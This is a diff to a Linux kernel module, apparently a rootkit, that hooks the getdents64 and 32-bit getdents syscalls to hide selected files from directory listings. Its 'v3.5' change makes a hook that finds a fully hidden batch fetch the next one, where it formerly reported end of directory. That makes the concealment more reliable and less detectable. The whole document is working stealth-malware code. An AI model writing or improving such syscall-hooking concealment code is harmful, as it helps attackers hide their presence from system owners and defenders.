@@ -126,6 +126,12 @@ static long filter_dirents(void *kdirp, long ret, size_t name_off) {
 
 /* ================================================================
  * getdents64 hook — filter directory listing
+ *
+ * v3.5: if EVERY entry of a batch is hidden, we must NOT return 0 —
+ * userspace would read it as EOF and silently lose the visible files
+ * of later batches.  The original syscall advanced file->f_pos past
+ * the consumed batch, so we simply ask for the next batch until the
+ * filter keeps something or the directory truly ends.
  * ================================================================ */
 asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
     long (*orig_getdents64)(const struct pt_regs *);
@@ -135,42 +141,43 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
 
     orig_getdents64 = (void *)hooks[HOOKIDX_GETDENTS64].original;
 
-    /* Run the real syscall first — it fills the user buffer */
-    ret = orig_getdents64(regs);
-    if (ret <= 0)
-        return ret;
+    for (;;) {
+        /* Run the real syscall first — it fills the user buffer and
+         * advances f_pos. */
+        ret = orig_getdents64(regs);
+        if (ret <= 0)
+            return ret;   /* real EOF or error — pass through */
 
-    kdirp = kmalloc(ret, GFP_KERNEL);
-    if (!kdirp)
-        return ret;
+        kdirp = kmalloc(ret, GFP_KERNEL);
+        if (!kdirp)
+            return ret;
 
-    if (copy_from_user(kdirp, dirp, ret)) {
-        kfree(kdirp);
-        return ret;
-    }
-
-    kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent64, d_name));
-
-    if (kept == 0) {
-        /* Every entry in this batch is hidden — report EOF */
-        kfree(kdirp);
-        return 0;
-    }
-
-    if (kept < ret) {
-        if (copy_to_user(dirp, kdirp, kept)) {
+        if (copy_from_user(kdirp, dirp, ret)) {
             kfree(kdirp);
-            return -EFAULT;
+            return ret;
         }
-        ret = kept;
-    }
 
-    kfree(kdirp);
-    return ret;
+        kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent64, d_name));
+
+        if (kept > 0) {
+            if (kept < ret) {
+                if (copy_to_user(dirp, kdirp, kept)) {
+                    kfree(kdirp);
+                    return -EFAULT;
+                }
+            }
+            kfree(kdirp);
+            return kept;
+        }
+
+        /* Whole batch hidden — loop for the next one (v3.5). */
+        kfree(kdirp);
+    }
 }
 
 /* ================================================================
- * getdents (32-bit compat) hook
+ * getdents (32-bit compat) hook — same multi-batch loop as the 64
+ * bit variant (v3.5): a fully-hidden batch is not EOF.
  * ================================================================ */
 asmlinkage long hooked_getdents(const struct pt_regs *regs) {
     long (*orig_getdents)(const struct pt_regs *);
@@ -180,36 +187,35 @@ asmlinkage long hooked_getdents(const struct pt_regs *regs) {
 
     orig_getdents = (void *)hooks[HOOKIDX_GETDENTS].original;
 
-    ret = orig_getdents(regs);
-    if (ret <= 0)
-        return ret;
+    for (;;) {
+        ret = orig_getdents(regs);
+        if (ret <= 0)
+            return ret;
 
-    kdirp = kmalloc(ret, GFP_KERNEL);
-    if (!kdirp)
-        return ret;
+        kdirp = kmalloc(ret, GFP_KERNEL);
+        if (!kdirp)
+            return ret;
 
-    if (copy_from_user(kdirp, dirp, ret)) {
-        kfree(kdirp);
-        return ret;
-    }
-
-    kept = filter_dirents(kdirp, ret, offsetof(struct vk_dirent32, d_name));
-
-    if (kept == 0) {
-        kfree(kdirp);
-        return 0;
-    }
-
-    if (kept < ret) {
-        if (copy_to_user(dirp, kdirp, kept)) {
+        if (copy_from_user(kdirp, dirp, ret)) {
             kfree(kdirp);
-            return -EFAULT;
+            return ret;
         }
-        ret = kept;
-    }
 
-    kfree(kdirp);
-    return ret;
+        kept = filter_dirents(kdirp, ret, offsetof(struct vk_dirent32, d_name));
+
+        if (kept > 0) {
+            if (kept < ret) {
+                if (copy_to_user(dirp, kdirp, kept)) {
+                    kfree(kdirp);
+                    return -EFAULT;
+                }
+            }
+            kfree(kdirp);
+            return kept;
+        }
+
+        kfree(kdirp);
+    }
 }
 
 /* ================================================================
